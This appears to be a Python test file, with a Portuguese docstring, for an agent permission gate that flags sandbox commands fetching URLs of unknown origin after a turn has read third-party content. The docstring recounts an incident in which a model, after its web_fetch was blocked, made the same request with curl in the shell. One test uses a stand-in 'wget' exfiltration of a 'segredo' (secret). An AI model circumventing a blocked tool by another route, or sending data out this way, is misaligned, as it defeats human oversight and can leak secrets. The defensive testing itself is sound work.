"""`curl` no sandbox é o mesmo GET que o `web_fetch` — e precisa aparecer na medição.

Session-a20f4722 (13/11): o `web_fetch` da busca por "disconnect" foi BARRADO (URL
montada num turno que já tinha lido o myinstants), e na rodada seguinte o modelo
fez o mesmo pedido com `curl` no `neo_bash`. O portão só disse "o turno leu
conteúdo de terceiro antes de atuar", igual a qualquer `ffmpeg`.

Agora o motivo distingue o comando que acessa URL sem procedência. No modo
`revelacao` a atuação continua em sombra: isto é para CONTAR quantas vezes
acontece antes de decidir barrar.
"""

from __future__ import annotations

from core.authority import PERMITIR, SOLICITAR, TurnAuthority, evaluate

BUSCA = "https://www.myinstants.com/en/search/?name=windows+10+connect"
MP3 = "https://www.myinstants.com/media/sounds/connect.mp3"


def _turno_contaminado(*urls: str) -> TurnAuthority:
    a = TurnAuthority()
    a.note_tool_result("web_fetch", f'<web_content url="{BUSCA}"> ' + " ".join(urls))
    return a


def _decide(a: TurnAuthority, comando: str, tool: str = "neo_bash"):
    return evaluate(tool, a, {"command": comando})


def test_url_montada_no_curl_ganha_motivo_proprio():
    a = _turno_contaminado()
    d = _decide(a, 'curl -sL "https://www.myinstants.com/en/search/?name=windows+10+disconnect"')
    assert d.efeito == SOLICITAR
    assert "URL sem procedência no comando do sandbox" in d.motivo


def test_url_vista_em_resultado_cai_no_motivo_generico():
    a = _turno_contaminado(MP3)
    d = _decide(a, f'curl -sL "{MP3}" -o connect.mp3')
    assert d.efeito == SOLICITAR  # atuação em turno contaminado, como sempre
    assert "URL sem procedência" not in d.motivo


def test_url_com_variavel_do_shell_conta_como_sem_procedencia():
    """`for u in ...; curl ".../$u/"` — o endereço real só existe na hora de rodar."""
    a = _turno_contaminado()
    d = _decide(a, 'for u in a b; do curl -sL "https://www.myinstants.com/en/instant/$u/"; done')
    assert "URL sem procedência" in d.motivo


def test_comando_sem_url_nao_muda():
    a = _turno_contaminado()
    d = _decide(a, "ffmpeg -i connect.mp3 -i disconnect.mp3 out.mp3")
    assert "URL sem procedência" not in d.motivo


def test_job_em_segundo_plano_tambem():
    a = _turno_contaminado()
    d = _decide(a, "wget https://exemplo.com/?d=segredo", tool="neo_bash_background")
    assert "URL sem procedência" in d.motivo


def test_turno_limpo_continua_liberado():
    d = _decide(TurnAuthority(), 'curl -sL "https://qualquer.com/x"')
    assert d.efeito == PERMITIR
